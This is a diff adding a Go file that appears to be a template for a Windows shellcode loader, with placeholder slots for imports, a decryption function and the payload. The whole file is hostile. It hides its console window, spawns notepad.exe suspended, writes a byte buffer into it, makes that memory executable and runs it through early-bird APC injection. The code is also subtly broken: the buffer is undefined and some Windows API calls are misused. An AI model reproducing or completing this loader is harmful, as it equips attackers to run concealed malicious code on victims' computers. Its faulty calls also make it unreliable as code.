@@ -1,0 +1,51 @@
+package main
+
+import (
+	"github.com/gonutz/ide/w32"
+	"golang.org/x/sys/windows"
+	"unsafe"
+	//__import__
+)
+func closeWindows(commandShow uintptr) {
+	console := w32.GetConsoleWindow()
+	if console != 0 {
+		_, consoleProcID := w32.GetWindowThreadProcessId(console)
+		if w32.GetCurrentProcessId() == consoleProcID {
+			w32.ShowWindowAsync(console, commandShow)
+		}
+	}
+}
+// 解密函数
+func f() {}
+
+func main() {
+	// shellcode
+	closeWindows(w32.SW_HIDE)
+	//__init__
+	kernel32 := windows.NewLazyDLL("kernel32.dll")
+	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
+	VirtualProtect := kernel32.NewProc("VirtualProtect")
+	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	QueueUserAPC := kernel32.NewProc("QueueUserAPC")
+	procInfo := &windows.ProcessInformation{}
+	startupInfo := &windows.StartupInfo{
+		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
+		ShowWindow: 1,
+	}
+	program, _ := windows.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
+	args, _ := windows.UTF16PtrFromString("")
+	_ = windows.CreateProcess(
+		program,
+		args,
+		nil, nil, true,
+		windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo,
+		)
+	addr, _, _ := VirtualAlloc.Call(uintptr(procInfo.Process), 0, uintptr(len(byteSlice)),0x1000, 0x04)
+	WriteProcessMemory.Call(uintptr(procInfo.Process), addr,(uintptr)(unsafe.Pointer(&byteSlice[0])), uintptr(len(byteSlice)))
+	oldProtect := 0x04
+	VirtualProtect.Call(uintptr(procInfo.Process), addr,uintptr(len(byteSlice)), 0x10, uintptr(unsafe.Pointer(&oldProtect)))
+	QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
+	windows.ResumeThread(procInfo.Thread)
+	windows.CloseHandle(procInfo.Process)
+	windows.CloseHandle(procInfo.Thread)
+}
